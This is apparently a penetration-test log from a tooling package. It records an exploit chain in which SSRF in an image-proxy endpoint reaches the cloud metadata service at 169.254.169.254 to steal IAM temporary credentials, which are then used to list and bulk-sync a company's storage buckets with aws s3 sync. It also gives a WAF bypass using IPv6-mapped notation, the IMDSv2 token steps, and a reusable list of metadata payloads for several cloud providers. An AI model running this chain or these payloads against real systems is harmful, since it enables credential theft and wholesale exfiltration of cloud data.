# [2026-02] SSRF → cloud metadata → AK/SK → full OSS bucket data

## Scenario classification
Web pentest / cloud security

## Target overview
Via a web application's SSRF vulnerability, reach the cloud metadata service, obtain temporary credentials, and ultimately export all data from an OSS bucket.

## Full execution chain

1. Discover SSRF in an image-proxy endpoint
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port probe succeeded)
   ```
2. Try to access cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → returns a metadata directory listing
   ```
3. Get the IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Use the credentials to enumerate OSS buckets
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Find a sensitive bucket and export the data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| SSRF blocked by WAF for 169.254 | IP blacklist | Bypass with IPv6 notation `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire after 1 hour | Short STS token lifetime | Write a script to auto-refresh the token | 10min |
| Metadata v2 requires a token | IMDSv2 protection | PUT to get a token first, then request with the token | 20min |

## Toolchain findings
- Alibaba Cloud and AWS metadata paths differ; try each separately
- IMDSv2 requires a two-step request (PUT for token → GET with token)
- Some cloud providers enable IMDSv2 by default, raising the SSRF difficulty

## Key code/commands

```bash
# IMDSv2 bypass (requires the SSRF to support custom Method and Header)
# Step 1: obtain a token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: request with the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns/script snippets

```bash
# SSRF cloud metadata quick-check payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Improvement suggestions for this package
- routing.md already has SSRF/cloud-security routing ✓
- Suggest adding a cloud-vendor metadata path comparison table to pentest-tools/references

## Evolution actions
- [ ] Add the cloud metadata path comparison table to references

## Environment info
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: full-response (Full SSRF)
